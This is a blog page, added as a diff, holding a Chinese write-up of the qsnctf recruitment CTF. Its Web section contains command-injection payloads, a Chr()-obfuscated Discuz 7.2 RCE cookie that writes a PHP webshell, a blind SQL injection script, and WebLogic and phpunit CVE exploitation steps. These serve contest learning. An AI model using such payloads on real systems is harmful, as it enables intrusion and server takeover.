@@ -1,0 +1,470 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><meta name="referrer" content="no-referrer"><title>弱口令安全实验室招新赛qsnctf题解 | Anyyy安全小站</title><meta name="keywords" content="刷题,CTF"><meta name="author" content="Anyyy"><meta name="copyright" content="Anyyy"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="排名12 整体题目不算特别难，简单的题好多没做出来，然后后面也没有耐心去看re和pwn了。 再加油吧。 口吐芬芳个人评价是题目分值不怎么合理，一些难的题目分少。 还有就是，题目放的hint我是真觉得没什么作用，你提示了还不如不提示呢，好几个提示都长一样，你要提示就实质性一点 非要讲什么大白话。。 web难度还行，差一道AK 算简单的一类题。 crypto好几道古典密码没做出来，有点偏脑洞。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="弱口令安全实验室招新赛qsnctf题解">
+<meta property="og:url" content="http://www.anyiblog.top/2022/11/19/20221119/index.html">
+<meta property="og:site_name" content="Anyyy安全小站">
+<meta property="og:description" content="排名12 整体题目不算特别难，简单的题好多没做出来，然后后面也没有耐心去看re和pwn了。 再加油吧。 口吐芬芳个人评价是题目分值不怎么合理，一些难的题目分少。 还有就是，题目放的hint我是真觉得没什么作用，你提示了还不如不提示呢，好几个提示都长一样，你要提示就实质性一点 非要讲什么大白话。。 web难度还行，差一道AK 算简单的一类题。 crypto好几道古典密码没做出来，有点偏脑洞。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://cdn.anyiblog.top/common/640.png">
+<meta property="article:published_time" content="2022-11-18T16:00:00.000Z">
+<meta property="article:modified_time" content="2023-05-07T07:58:58.572Z">
+<meta property="article:author" content="Anyyy">
+<meta property="article:tag" content="刷题">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://cdn.anyiblog.top/common/640.png"><link rel="shortcut icon" href="http://cdn.anyiblog.top/img/favicon.png"><link rel="canonical" href="http://www.anyiblog.top/2022/11/19/20221119/"><link rel="preconnect" href="//fastly.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.json","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#121212","position":"top-right"},
+  source: {
+    justifiedGallery: {
+      js: 'https://fastly.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
+      css: 'https://fastly.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '弱口令安全实验室招新赛qsnctf题解',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-05-07 15:58:58'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><div class="aplayer" data-id="7356458861" data-server="netease" data-type="playlist" data-fixed="true" data-listFolded="false" data-order="random" data-preload="none"></div><link rel="stylesheet" href="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.css"><script src="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.js"></script><script src="https://fastly.jsdelivr.net/npm/meting@1.2.0/dist/Meting.min.js"></script><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/background.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/gh/sviptzk/HexoStaticFile@latest/Hexo/css/flink.min.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/gh/sviptzk/HexoStaticFile@latest/Hexo/css/hideCategory.min.css"><script src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script><script src="/js/sweetalert.js"></script><link rel="stylesheet" href="/css/sweetalert.css"><!-- 仅首页弹窗通知 welcome--><!--link(rel="stylesheet" href="APlayer.min.css")--><div id="aplayer"></div><script src="http://cdn.anyiblog.top/js/Meting.min2.js" async></script><script src="http://cdn.anyiblog.top/js/Meting.min2.js" async></script><meta name="generator" content="Hexo 6.0.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="http://cdn.anyiblog.top/img/avatar.jpg" onerror="onerror=null;src='http://cdn.anyiblog.top/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">36</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">9</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">21</div></a></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div><div class="menus_item"><a class="site-page" href="/inform/"><i class="fa-fw fa-fw fa fa-coffee"></i><span> 通知</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="not-top-img" id="page-header"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Anyyy安全小站</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div><div class="menus_item"><a class="site-page" href="/inform/"><i class="fa-fw fa-fw fa fa-coffee"></i><span> 通知</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav></header><main class="layout" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">弱口令安全实验室招新赛qsnctf题解</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-11-18T16:00:00.000Z" title="发表于 2022-11-19 00:00:00">2022-11-19</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-05-07T07:58:58.572Z" title="更新于 2023-05-07 15:58:58">2023-05-07</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/">刷题笔记</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/Writeup/">Writeup</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">3.7k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>15分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="弱口令安全实验室招新赛qsnctf题解"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div><article class="post-content" id="article-container"><p><img src="http://cdn.anyiblog.top/common/1668766349116-c887c399-6e06-4d7b-a674-ad3f631ac021.jpg">  </p>
+<p>排名12 整体题目不算特别难，简单的题好多没做出来，然后后面也没有耐心去看re和pwn了。</p>
+<p>再加油吧。</p>
+<h1 id="口吐芬芳"><a href="#口吐芬芳" class="headerlink" title="口吐芬芳"></a>口吐芬芳</h1><p>个人评价是题目分值不怎么合理，一些难的题目分少。</p>
+<p>还有就是，题目放的hint我是真觉得没什么作用，你提示了还不如不提示呢，好几个提示都长一样，你要提示就实质性一点 非要讲什么大白话。。</p>
+<p>web难度还行，差一道AK 算简单的一类题。</p>
+<p>crypto好几道古典密码没做出来，有点偏脑洞。</p>
+<p>re好几题都是windows程序，IDA基本函数不识别很多看不懂，看得太累了，不会做也不太想做。</p>
+<p>pwn是自己莼菜，简单题也是有的。</p>
+<p>重点表扬一下misc！！套了太多没必要的知识点，比如那一长串hex的压缩包 真没有什么必要。。以及那道图片里的base64 我寻思哪个OCR这么牛逼能识别这么多数据，做完是真的很想骂人，纯恶心。出题人更是重量级，用线程+循环正则匹配就能解决100%，不得不说有点实力。最后出个原神的文字密码我真是大无语。</p>
+<p>心情复杂，比完第一时间就是痛骂出题人。。</p>
+<p>（认为我说的不对略过这段话就行 大可不用理会）</p>
+<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h3 id="开胃菜"><a href="#开胃菜" class="headerlink" title="开胃菜"></a>开胃菜</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(strlen($_GET[1]&amp;&amp;$_GET[1]&lt;=5))&#123;</span><br><span class="line">    echo strlen($_GET[1]);</span><br><span class="line">    echo &#x27;&lt;hr/&gt;&#x27;;</span><br><span class="line">    echo shell_exec($_GET[1]);</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>直接RCE了，直接传参</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?1=cat /flag</span><br></pre></td></tr></table></figure>
+
+<p>qsnctf{32ca8f37-6d2f-4e91-89c3-7c148f2fb981}</p>
+<h3 id="签到小能手"><a href="#签到小能手" class="headerlink" title="签到小能手"></a>签到小能手</h3><p><img src="http://cdn.anyiblog.top/common/1668766349983-44d431e2-cee8-4726-b05e-3315facf946d.jpg"><br>就在index.php，尝试访问其备份文件index.php.bak 发现能下载。得到flag</p>
+<p><img src="http://cdn.anyiblog.top/common/1668766350359-3a311800-a994-43eb-9dde-b45a77d418bb.jpg"><br>qsnctf{ae2cf82a-90a2-460a-b6bd-ac7466cde0e2}</p>
+<h3 id="小镇做题家"><a href="#小镇做题家" class="headerlink" title="小镇做题家"></a>小镇做题家</h3><p><img src="http://cdn.anyiblog.top/common/1668766350814-c90ea882-aebf-4615-8f7a-932c9a805898.jpg"><br>访问robots.txt发现有GAME路径</p>
+<p><img src="http://cdn.anyiblog.top/common/1668766351165-6b33c8aa-7cf3-4868-93c7-eabce85116d8.jpg"><br>dirb扫描下，发现GAME&#x2F;index.html</p>
+<p>访问发现是一个前端贪吃蛇游戏</p>
+<p><img src="http://cdn.anyiblog.top/common/1668766351634-1e67be21-cb2a-47a6-8b9f-e08cdf921de5.jpg"><br>直接去找其js文件，发现了base数据</p>
+<p><img src="http://cdn.anyiblog.top/common/1668766352034-cce5a8ae-b265-42bd-b567-6eee4e6e4b12.jpg">  </p>
+<p><img src="http://cdn.anyiblog.top/common/1668766352471-941fced3-9be8-4e89-a880-d79c916fc253.jpg"><br>解密得到提示路径</p>
+<p><img src="http://cdn.anyiblog.top/common/1668766352826-ba6453b9-9cb5-44ad-8f10-51041a5c0bbe.jpg"><br>让我们传一个payload，能读想读的文件</p>
+<p>尝试传&#x2F;etc&#x2F;passwd 发现读取成功<br><img src="http://cdn.anyiblog.top/common/1668766353284-48bd8a2d-c89b-4b00-af5e-5b27252dd272.jpg"><br>但尝试输入php:&#x2F;&#x2F;filter读取时却没东西<br><img src="http://cdn.anyiblog.top/common/1668766353630-82585624-28bb-4764-9c2f-0d3438a2c02f.jpg"><br>说明代码的实现不是用php，可能是直接在shell里面执行，那么用运算符绕过下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.txt|ls</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://cdn.anyiblog.top/common/1668766353984-00aca6d9-0bd5-4be8-a261-4f44567ef54f.jpg"><br>成功执行，尝试cat &#x2F;flag发现有过滤空格 那么加一个$IFS$9 简单bypass</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Payload：?payload=1.txt|cat$IFS$9/fl*</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://cdn.anyiblog.top/common/1668766354365-a9484733-93c8-4f57-a5ca-621a6222996f.jpg"><br>qsnctf{16aef423-879d-40af-abec-7484c5dc56f4}</p>
+<h3 id="Discuz"><a href="#Discuz" class="headerlink" title="Discuz"></a>Discuz</h3><p>Discuz社区论坛cms，发现版本为7.2</p>
+<p><img src="http://cdn.anyiblog.top/common/1668766354763-f53bda15-7581-4939-80f3-c0ab9c36e4e8.jpg"><br>百度搜下漏洞，参考文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_65129142/article/details/122061221">https://blog.csdn.net/m0_65129142&#x2F;article&#x2F;details&#x2F;122061221</a></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">URL:viewthread.php?tid=10&amp;extra=page</span><br><span class="line">Cookie: GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://cdn.anyiblog.top/common/1668766355200-f674a423-76b1-4565-9aec-c550bfcd6c41.jpg"><br>写一个马利用</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#wf.php post:lalala</span><br><span class="line">GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=eval(Chr(102).Chr(112).Chr(117).Chr(116).Chr(115).Chr(40).Chr(102).Chr(111).Chr(112).Chr(101).Chr(110).Chr(40).Chr(39).Chr(119).Chr(102).Chr(46).Chr(112).Chr(104).Chr(112).Chr(39).Chr(44).Chr(39).Chr(119).Chr(39).Chr(41).Chr(44).Chr(39).Chr(60).Chr(63).Chr(112).Chr(104).Chr(112).Chr(32).Chr(64).Chr(101).Chr(118).Chr(97).Chr(108).Chr(40).Chr(36).Chr(95).Chr(80).Chr(79).Chr(83).Chr(84).Chr(91).Chr(108).Chr(97).Chr(108).Chr(97).Chr(108).Chr(97).Chr(93).Chr(41).Chr(63).Chr(62).Chr(39).Chr(41).Chr(59))</span><br></pre></td></tr></table></figure>
+
+<p>传参得到flag</p>
+<p><img src="http://cdn.anyiblog.top/common/1668766355598-4db8a181-a39d-4813-94da-8ef567b4fb82.jpg"><br>qsnctf{521407c4-bdd6-41e5-9c68-32878ce2ad17}</p>
+<h3 id="Queen"><a href="#Queen" class="headerlink" title="Queen"></a>Queen</h3><p>一个登录界面，刚开始先f12看network状况，发现登进去的数据先传进login.php</p>
+<p><img src="http://cdn.anyiblog.top/common/1668766356232-92001485-ad80-4bdd-81e1-1193a97e9681.jpg"><br><img src="http://cdn.anyiblog.top/common/1668766356589-3839dd90-211f-430b-9af6-89e24012f277.jpg"><br>要本地，hackbar头数据加一个X-Forwarded-For:127.0.0.1</p>
+<p>发包再看network状态，发现多了一个check.php</p>
+<p><img src="http://cdn.anyiblog.top/common/1668766356962-b99074e6-269f-4cc4-91a5-8256b1121818.jpg"><br>内容data是一个base64，解密看看</p>
+<p><img src="http://cdn.anyiblog.top/common/1668766357300-317271a7-5997-423e-ad97-fe1e539ac071.jpg"><br>发现我们传进的数据被base64加密了，user处可能存在sql注入漏洞，那么我们按照格式写好payload再base64编码 最后发送到服务器看看。</p>
+<p>同时该请求是一个302重定向，用python requests处理下能看回显</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = &quot;http://89f188af-9856-452f-9aed-f4ea82f83339.recruit.qsnctf.com:8080/check.php?data=dXNlcjphYWF8cGFzczphYWE=&quot;</span><br><span class="line">headers = &#123;&quot;X-Forwarded-For&quot;:&quot;127.0.0.1&quot;&#125;</span><br><span class="line">http = requests.get(url,headers=headers,allow_redirects=False)</span><br><span class="line">print(http.text)</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://cdn.anyiblog.top/common/1668766357644-bb5643bd-6380-4501-9b63-75b87794d487.jpg"><br>构建payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user:admin&#x27; and 1=1 #|pass:aaa</span><br></pre></td></tr></table></figure>
+<p>发送发现回显是登陆成功。<br><img src="http://cdn.anyiblog.top/common/1668766357962-371bcca2-0e63-41f9-acce-b4184cce2306.jpg">  </p>
+<p>所以这里是布尔盲注，我们可以用substr截断数据库或表名等字符串，然后再遍历ascii表，用if判断如果为结果为正确则为1，反则为0</p>
+<p>这样通过回显就能爆破出数据库、表、字段和里面的内容了。</p>
+<p>写了一个脚本，payload换用下即可。</p>
+<p>爆出来数据为sql，表名为user，字段有id username password，flag在username字段</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line">import time</span><br><span class="line">import string</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">def main():</span><br><span class="line">    table = string.printable.strip()</span><br><span class="line">    res = &quot;&quot;</span><br><span class="line">    i = 1</span><br><span class="line">    while 1:</span><br><span class="line">        n = 0</span><br><span class="line">        while n &lt; len(table):</span><br><span class="line">            #payload = f&quot;admin&#x27; and if(substr((select group_concat(schema_name) from information_schema.schemata),&#123;i&#125;,1)=&#x27;&#123;table[n]&#125;&#x27;,1,0); #&quot;  </span><br><span class="line">            #information_schema,mysql,performance_schema,ctftraining,test,sql</span><br><span class="line">            #payload = f&quot;admin&#x27; and if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;i&#125;,1)=&#x27;&#123;table[n]&#125;&#x27;,1,0); #&quot;</span><br><span class="line">            #flag_table,news,users # limit 1,1</span><br><span class="line">            #payload = f&quot;admin&#x27; and if(substr((select group_concat(column_name) from information_schema.columns where table_schema=&#x27;ctftraining&#x27; and table_name=&#x27;users&#x27;),&#123;i&#125;,1)=&#x27;&#123;table[n]&#125;&#x27;,1,0); #&quot;</span><br><span class="line">            payload = f&quot;admin&#x27; and if(substr((select group_concat(password) from sql.user where username=&#x27;flag&#x27;),&#123;i&#125;,1)=&#x27;&#123;table[n]&#125;&#x27;,1,0); #&quot;</span><br><span class="line">            print(payload)</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">            payload = &quot;user:&#123;&#125;|pass:admin&quot;.format(payload)</span><br><span class="line">            content = base64.b64encode(payload.encode()).decode()</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">            url = f&quot;http://89f188af-9856-452f-9aed-f4ea82f83339.recruit.qsnctf.com:8080/check.php?data=&#123;content&#125;&quot;</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">            headers = &#123;&quot;X-Forwarded-For&quot;:&quot;127.0.0.1&quot;&#125;</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">            s = requests.Session()</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">            http = s.get(url,headers=headers,allow_redirects=False)</span><br><span class="line">            if &quot;登陆成功&quot; in http.text:</span><br><span class="line">                i += 1</span><br><span class="line">                res += table[n]</span><br><span class="line">                break</span><br><span class="line">            print(res)</span><br><span class="line">            n += 1</span><br><span class="line">        if n == len(table):</span><br><span class="line">            break</span><br><span class="line">main()</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://cdn.anyiblog.top/common/1668766358300-603216d1-6682-440d-9da5-58368015c19c.jpg"><br>qsnctf{8f55dfd1-4025-4095-96a8-6c7b14c14f91}</p>
+<h3 id="Weblogic"><a href="#Weblogic" class="headerlink" title="Weblogic"></a>Weblogic</h3><p><img src="http://cdn.anyiblog.top/common/1668766358769-5dc7f0ff-6a27-4c42-9454-1002cd1967d4.jpg"><br>打开题目，如题所述是Weblogic，即weblogic server，版本是10.3</p>
+<p>这里的漏洞是CVE-2019-2725 反序列化漏洞</p>
+<p>刚开始尝试自己去利用，但自己用有太多的bug了 就用poc利用了。</p>
+<p>POC: <a target="_blank" rel="noopener" href="https://github.com/TopScrew/CVE-2019-2725">https://github.com/TopScrew/CVE-2019-2725</a></p>
+<p>利用poc写一个jsp马</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python weblogic-2019-2725.py 10.3.6 http://3fa5ca87-da93-4472-b33d-cd66efd5a816.recruit.qsnctf.com:8080</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://cdn.anyiblog.top/common/1668766359136-dde3095e-5107-4907-ac16-dcac9a3d2530.jpg"><br>qsnctf{31d1e8e5-ede7-48e4-8f92-cd40a23d8e00}</p>
+<h3 id="Where"><a href="#Where" class="headerlink" title="Where"></a>Where</h3><p>一个找网页的题目，都是各种各样的网页。。</p>
+<p>访问容器，发现是一个前端网页 对我们做题没帮助</p>
+<p><img src="http://cdn.anyiblog.top/common/1668766360084-46a22a45-83d7-4a1e-92c1-9c42ca7f3fa9.jpg"><br>尝试搜索robots.txt看看有没有信息</p>
+<p><img src="http://cdn.anyiblog.top/common/1668766360492-4daa0b63-4977-4dff-9703-a1a040cf96da.jpg"><br>给了一个路径&#x2F;admin&#x2F;（吐槽下你不放hint放这种没用的数据是几个意思？？）</p>
+<p>访问是一个登录平台，随便登陆下发现url给了下一个路径的提示</p>
+<p><img src="http://cdn.anyiblog.top/common/1668766361740-367f2158-1fea-4b2d-9534-e5683fab0005.jpg"><br><img src="http://cdn.anyiblog.top/common/1668766362191-68efebdf-8519-4d37-86a3-1c276d067bdb.jpg"><br>访问&#x2F;vendor&#x2F;有这个路径但不知道里面的文件</p>
+<p><img src="http://cdn.anyiblog.top/common/1668766362533-fb931da8-90bc-4d03-b7a4-82d55d3c8b10.jpg"><br>尝试百度vendor</p>
+<p><img src="http://cdn.anyiblog.top/common/1668766362916-a1e88229-a30b-4cf6-b39c-0019c1f09280.jpg"><br>发现了相关的路径，看了下发现这个eval-stdin.php有rce漏洞 </p>
+<p>phpunit CVE-2017-9841</p>
+<p>漏洞原理是因为该文件执行了php:&#x2F;&#x2F;input这个代码，造成远程代码执行。</p>
+<p>这里用burpsuite进行执行代码，用hackbar会执行不了。</p>
+<p><img src="http://cdn.anyiblog.top/common/1668766363338-b4a8424e-0f9d-4244-b40c-d1cae92eafcc.jpg"><br>qsnctf{26c3ad89-2f03-45b7-aeb8-97a3c6be28b6}</p>
+<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p><img src="http://cdn.anyiblog.top/common/1668766363700-b4951451-23cc-400f-8191-7909a56d7a01.jpg"><br>根据提示尝试公众号发送linux命令，发现可以执行 cat &#x2F;flag即可</p>
+<p><img src="http://cdn.anyiblog.top/common/1668766364033-755a9d2c-96cb-4922-bb57-3c5ac4eb1a99.jpg">  </p>
+<p>qsnctf{ba3c9f2e-56a8-416b-bc5d-dd379dede335}</p>
+<h3 id="EasyMisc"><a href="#EasyMisc" class="headerlink" title="EasyMisc"></a>EasyMisc</h3><p><img src="http://cdn.anyiblog.top/common/1668766364408-152c13a7-1542-43fa-9ee8-191bc8c15aa5.jpg"><br>下载附件得到docx文件，直接改后缀为.zip看word&#x2F;document.xml文件</p>
+<p><img src="http://cdn.anyiblog.top/common/1668766364722-c5afd7b0-906a-40b3-a560-17a9965c170e.jpg"><br>发现base64，解密下，得到压缩包的hex值</p>
+<p><img src="http://cdn.anyiblog.top/common/1668766365144-1544cf88-aa50-4d59-b060-599ec0c974a0.jpg"><br>处理下空格 写到文件里。</p>
+<p><img src="http://cdn.anyiblog.top/common/1668766365527-f401cd30-9fe0-47a4-bb88-27b233f38f0b.jpg"><br>qsnctf{177af0b9-fbed-4a1e-a09f-4a580940c28c}</p>
+<h3 id="奇怪又不奇怪"><a href="#奇怪又不奇怪" class="headerlink" title="奇怪又不奇怪"></a>奇怪又不奇怪</h3><p>下载附件得到图片：</p>
+<p><img src="http://cdn.anyiblog.top/common/1668766365937-3fbae3e6-eb6a-4cf9-ae7d-713601e0d857.jpg"><br>能看出来是某种文字密码，但不知道是什么密码。卡了几天想到出题人是OP猜测是原神的文字表（…?）</p>
+<p><img src="http://cdn.anyiblog.top/common/1668766369436-516c1dfc-eb96-4063-9cc0-2ee35b349243.jpg"><br>对照得到flag</p>
+<p>flag{moxiahjack}</p>
+<p>脑洞题，题目描述提示了个寂寞。</p>
